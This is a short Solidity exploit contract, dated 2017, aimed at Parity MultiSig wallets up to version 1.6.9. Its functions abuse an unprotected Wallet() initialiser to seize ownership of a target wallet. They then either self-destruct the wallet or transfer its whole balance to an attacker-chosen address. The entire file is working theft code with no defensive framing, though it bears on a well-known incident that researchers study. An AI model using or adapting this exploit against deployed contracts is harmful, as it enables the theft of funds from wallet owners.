1 // nimrood, 2017-07-21
2 // Parity MultiSig Wallet exploit up to 1.6.9
3 //
4 pragma solidity ^0.4.13;
5 
6 // Parity Wallet methods
7 contract WalletAbi {
8 
9   function kill(address _to);
10   function Wallet(address[] _owners, uint _required, uint _daylimit);
11   function execute(address _to, uint _value, bytes _data) returns (bytes32 o_hash);
12   
13 }
14 
15 // Exploit a Parity MultiSig wallet
16 contract ExploitLibrary {
17     
18     // Take ownership of Parity Multisig Wallet
19     function takeOwnership(address _contract, address _to) public {
20         WalletAbi wallet = WalletAbi(_contract);
21         address[] newOwner;
22         newOwner.push(_to);
23         // Partiy multisig has a bug with Wallet()
24         wallet.Wallet(newOwner, 1, uint256(0-1));
25     }
26     
27     // Empty all funds by suicide
28     function killMultisig(address _contract, address _to) public {
29         takeOwnership(_contract, _to);
30         WalletAbi wallet = WalletAbi(_contract);
31         wallet.kill(_to);
32     }
33     
34     // Transfer funds from Multisig contract (_amount == 0 == all)
35     function transferMultisig(address _contract, address _to, uint _amount) public {
36         takeOwnership(_contract, _to);
37         uint amt = _amount;
38         WalletAbi wallet = WalletAbi(_contract);
39         if (wallet.balance < amt || amt == 0)
40             amt = wallet.balance;
41         wallet.execute(_to, amt, "");
42     }
43 
44 }